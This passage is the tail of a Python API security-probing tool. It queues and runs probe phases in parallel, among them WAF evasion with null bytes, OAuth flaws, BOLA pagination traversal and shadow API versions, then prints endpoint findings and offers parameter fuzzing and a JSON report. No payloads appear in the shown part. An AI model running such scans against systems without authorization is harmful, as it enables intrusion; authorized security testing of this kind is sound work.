    if focus in (None, "injection", "evasion") and depth in ("normal", "deep"):
        _phase_queue.append((25, "Null byte / WAF evasion", probe_null_byte_evasion, (base, api.endpoints)))
    if focus in (None, "oauth2", "auth") and depth in ("normal", "deep"):
        _phase_queue.append((26, "OAuth dynamic reg", probe_oauth_dynamic_reg, (base, api.endpoints)))
    if focus in (None, "graphql", "schema", "websocket") and depth in ("normal", "deep"):
        _phase_queue.append((27, "WebSocket / SSE", probe_websocket, (base,)))
    if focus in (None, "bola", "schema") and depth == "deep":
        _phase_queue.append((28, "Pagination traversal", probe_pagination_traversal, (base, api.endpoints)))
    if focus in (None, "schema", "shadow") and depth in ("normal", "deep"):
        _phase_queue.append((29, "Shadow/deprecated versions", probe_shadow_versions, (base, api.endpoints)))
    if focus in (None, "oauth2", "auth") and depth in ("normal", "deep"):
        _phase_queue.append((30, "OAuth state / PKCE", probe_oauth_state_pkce, (base,)))

    if _phase_queue:
        print(f"\n[*] Phases {[n for n,_,_,_ in _phase_queue]} — running in parallel (workers=6)...")
        _phase_results = {}
        with ThreadPoolExecutor(max_workers=6) as _ex:
            _futures = {
                _ex.submit(_run_phase_captured, fn, args): (num, label)
                for num, label, fn, args in _phase_queue
            }
            for _fut in as_completed(_futures):
                _num, _label = _futures[_fut]
                try:
                    _result, _output = _fut.result()
                    _phase_results[_num] = (_label, _result or [], _output)
                except Exception as _e:
                    _phase_results[_num] = (_label, [], f"  ERROR: {_e}\n")

        for _num in sorted(_phase_results):
            _label, _findings, _output = _phase_results[_num]
            print(f"\n[{_num}] {_label}...")
            if _output:
                print(_output, end="")
            api.findings.extend(_findings)

    # Summary
    print(f"\n{'='*60}")
    print(f"SUMMARY: {base}")
    print(f"  Framework: {api.framework}")
    print(f"  Endpoints: {len(api.endpoints)}")
    print(f"  Auth required: {api.auth_required}")
    for ep in api.endpoints:
        vuln_str = f" [VULNS: {list(ep.vuln_signals)}]" if ep.vuln_signals else ""
        print(f"  {' '.join(ep.methods)} {ep.path}{vuln_str}")
    print(f"{'='*60}")

    return api


if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(description="API Reverse Engineering Tool")
    ap.add_argument("target", help="Base URL (http://host:port)")
    ap.add_argument("--depth", choices=["quick", "normal", "deep"], default="normal")
    ap.add_argument("--focus",
                    choices=["injection", "schema", "state", "jwt", "auth", "bola",
                             "oauth2", "grpc", "graphql", "soap", "biz", "ssrf", "creds",
                             "cors", "nosql", "bfla", "pii", "timing", "evasion",
                             "websocket", "shadow"],
                    help="Focus on a specific RE dimension")
    ap.add_argument("--fuzz-params", metavar="PATH",
                    help="Deep parameter fuzzing for a specific path")
    ap.add_argument("--output", help="Write JSON report to file")
    ap.add_argument("--verbose", action="store_true",
                    help="Show non-confirming probe signals ([~] lines)")
    args = ap.parse_args()

    if args.verbose:
        VERBOSE = True

    api = run_re(args.target, depth=args.depth, focus=args.focus)

    if args.fuzz_params:
        print(f"\n[*] Deep param fuzzing: {args.fuzz_params}")
        ep = next((e for e in api.endpoints if e.path == args.fuzz_params), None)
        if ep:
            for param in ep.params:
                if param != "__body__":
                    print(f"\n  Probing param: {param}")
                    for method in ep.methods[:1]:
                        probe_param(args.target, ep.path, param, method)

    if args.output:
        out = {
            "base_url": api.base_url,
            "framework": api.framework,
            "endpoints": [asdict(e) for e in api.endpoints],
            "findings": _dedup_findings(api.findings),
            "notes": api.notes,
        }
        with open(args.output, "w") as f:
            json.dump(out, f, indent=2)
        print(f"\n[+] Report saved: {args.output} ({len(out['findings'])} findings)")
